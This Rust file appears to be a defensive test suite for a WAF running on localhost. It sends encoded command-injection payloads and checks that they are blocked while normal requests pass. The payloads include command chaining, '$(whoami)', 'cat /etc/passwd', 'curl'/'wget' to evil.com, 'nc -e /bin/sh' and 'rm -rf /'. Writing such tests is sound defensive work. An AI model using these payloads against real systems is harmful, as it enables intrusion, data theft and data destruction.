//! Command Injection Attack Test Suite
//!
//! Run with: cargo run --example command_injection_test
//!
//! Prerequisites:
//! 1. Start backend: cargo run --example mock_backend_tokio
//! 2. Start WAF: cargo run

use reqwest::blocking::Client;
use std::time::Duration;

fn main() {
    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .user_agent("PINGORA_WAF_TEST_SUITE")
        .build()
        .unwrap();

    println!("╔═══════════════════════════════════════════════╗");
    println!("║   Command Injection Detection Tests           ║");
    println!("╚═══════════════════════════════════════════════╝\n");

    let mut passed = 0;
    let mut failed = 0;

    // Test 1: Command chaining operators
    println!("🛡️  Test 1: Command Chaining Operators");
    let chaining_attacks = vec![
        ("/api/exec?cmd=test;ls", "Semicolon (;)"),
        ("/api/exec?cmd=test%7cls", "Pipe (|) encoded"),
        ("/api/exec?cmd=test%26%26whoami", "AND (&&) encoded"),
        ("/api/exec?cmd=test%7c%7cid", "OR (||) encoded"),
    ];

    for (path, desc) in &chaining_attacks {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!("   ✓ Blocked: {}", desc);
                passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ NOT BLOCKED ({}): {}", resp.status(), desc);
                failed += 1;
            }
            Err(e) => {
                println!("   ✗ Error: {} - {}", desc, e);
                failed += 1;
            }
        }
    }

    // Test 2: Command substitution
    println!("\n🛡️  Test 2: Command Substitution");
    let substitution_attacks = vec![
        ("/api/search?q=%24%28whoami%29", "$(command) encoded"),
        ("/api/search?q=%60id%60", "Backticks encoded"),
        ("/api/exec?var=%24%7BPATH%7D", "${VAR} encoded"),
    ];

    for (path, desc) in &substitution_attacks {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!("   ✓ Blocked: {}", desc);
                passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ NOT BLOCKED ({}): {}", resp.status(), desc);
                failed += 1;
            }
            Err(_) => {
                println!("   ✗ Error testing: {}", desc);
                failed += 1;
            }
        }
    }

    // Test 3: Shell redirections
    println!("\n🛡️  Test 3: Shell Redirections");
    let redirect_attacks = vec![
        (
            "/api/exec?cmd=echo%20test%3e/tmp/file",
            "> redirect encoded",
        ),
        ("/api/exec?cmd=cat%3c/etc/passwd", "< redirect encoded"),
    ];

    for (path, desc) in &redirect_attacks {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!("   ✓ Blocked: {}", desc);
                passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ NOT BLOCKED ({}): {}", resp.status(), desc);
                failed += 1;
            }
            Err(_) => {
                println!("   ✗ Error testing: {}", desc);
                failed += 1;
            }
        }
    }

    // Test 4: Dangerous commands
    println!("\n🛡️  Test 4: Dangerous Commands");
    let dangerous_commands = vec![
        ("/api/fetch?cmd=curl%20http://evil.com", "curl command"),
        ("/api/fetch?cmd=wget%20http://evil.com", "wget command"),
        ("/api/exec?cmd=nc%20-e%20/bin/sh", "netcat reverse shell"),
        ("/api/exec?cmd=rm%20-rf%20/tmp", "rm command"),
        ("/api/exec?cmd=chmod%20777%20file", "chmod command"),
    ];

    for (path, desc) in &dangerous_commands {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!("   ✓ Blocked: {}", desc);
                passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ NOT BLOCKED ({}): {}", resp.status(), desc);
                failed += 1;
            }
            Err(_) => {
                println!("   ✗ Error testing: {}", desc);
                failed += 1;
            }
        }
    }

    // Test 5: Shell paths
    println!("\n🛡️  Test 5: Shell Paths");
    let shell_paths = vec![
        ("/api/exec?shell=/bin/bash", "/bin/bash"),
        ("/api/exec?shell=/bin/sh", "/bin/sh"),
        ("/api/exec?shell=/usr/bin/python", "/usr/bin/python"),
        ("/api/exec?cmd=powershell%20-c%20test", "PowerShell"),
        ("/api/exec?cmd=cmd.exe%20/c%20dir", "cmd.exe"),
    ];

    for (path, desc) in &shell_paths {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!("   ✓ Blocked: {}", desc);
                passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ NOT BLOCKED ({}): {}", resp.status(), desc);
                failed += 1;
            }
            Err(_) => {
                println!("   ✗ Error testing: {}", desc);
                failed += 1;
            }
        }
    }

    // Test 6: Environment variables
    println!("\n🛡️  Test 6: Environment Variables");
    let env_attacks = vec![
        ("/api/exec?path=%24PATH", "$PATH"),
        ("/api/exec?home=%24HOME", "$HOME"),
        ("/api/exec?shell=%24SHELL", "$SHELL"),
    ];

    for (path, desc) in &env_attacks {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!("   ✓ Blocked: {}", desc);
                passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ NOT BLOCKED ({}): {}", resp.status(), desc);
                failed += 1;
            }
            Err(_) => {
                println!("   ✗ Error testing: {}", desc);
                failed += 1;
            }
        }
    }

    // Test 7: Command injection in body
    println!("\n🛡️  Test 7: Command Injection in Body");
    let body_attacks = vec![
        r#"{"cmd": "test; rm -rf /"}"#,
        r#"{"command": "$(whoami)"}"#,
        r#"{"exec": "test | cat /etc/passwd"}"#,
    ];

    for payload in &body_attacks {
        match client
            .post("http://localhost:6188/api/execute")
            .header("Content-Type", "application/json")
            .body(*payload)
            .send()
        {
            Ok(resp) if resp.status().as_u16() == 403 => {
                println!(
                    "   ✓ Blocked body injection: {}",
                    payload.chars().take(35).collect::<String>()
                );
                passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ NOT BLOCKED ({}): {}", resp.status(), payload);
                failed += 1;
            }
            Err(_) => {
                println!("   ✗ Error testing body injection");
                failed += 1;
            }
        }
    }

    // Test 8: Legitimate requests should pass
    println!("\n✅ Test 8: Legitimate Requests (should pass)");
    let legitimate = vec![
        ("/api/users/123", "User ID"),
        ("/api/search?q=hello+world", "Normal search"),
        ("/api/products?category=electronics", "Normal query"),
    ];

    for (path, desc) in &legitimate {
        match client.get(&format!("http://localhost:6188{}", path)).send() {
            Ok(resp) if resp.status().as_u16() == 200 => {
                println!("   ✓ Allowed: {}", desc);
                passed += 1;
            }
            Ok(resp) => {
                println!("   ✗ BLOCKED LEGITIMATE ({}): {}", resp.status(), desc);
                failed += 1;
            }
            Err(_) => {
                println!("   ✗ Error testing: {}", desc);
                failed += 1;
            }
        }
    }

    // Summary
    println!("\n╔═══════════════════════════════════════════════╗");
    println!("║   Command Injection Test Summary              ║");
    println!("╚═══════════════════════════════════════════════╝");
    println!("Total Tests: {}", passed + failed);
    println!("✅ Passed: {}", passed);
    println!("❌ Failed: {}", failed);
    println!(
        "Success Rate: {:.1}%\n",
        (passed as f64 / (passed + failed) as f64) * 100.0
    );

    if failed == 0 {
        println!("🎉 All command injection tests passed!");
    } else {
        println!("⚠️  Some tests failed. Review command injection configuration.");
    }
}
